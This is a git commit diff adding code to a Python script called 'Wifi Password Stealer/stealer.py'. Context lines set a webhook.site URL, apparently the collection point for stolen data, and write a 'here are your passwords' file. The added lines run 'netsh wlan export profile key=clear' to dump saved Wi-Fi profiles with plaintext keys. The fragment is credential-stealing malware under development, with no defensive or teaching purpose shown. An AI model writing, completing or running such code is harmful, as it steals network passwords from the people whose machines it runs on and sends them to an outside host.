0580725de043d0d31ed8df3150edea815d862221
69PercentFat <shubham11501@gmail.com>
2023-06-23 22:00:27 +0530

    lists

--- Wifi Password Stealer/stealer.py
+++ Wifi Password Stealer/stealer.py
@@ -9,3 +9,17 @@ url = 'https://webhook.site/7a5e65a7-ebef-47b5-a6c7-3a172100fe3b'
 password_file = open('passwords.txt', "w")
 password_file.write("hello sir! here are your passwords:\n\n")
 password_file.close()
+
+
+#lists
+
+wifi_files = []
+wifi_name = []
+wifi_password = []
+
+
+
+
+command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
+
+path = os.getcwd()
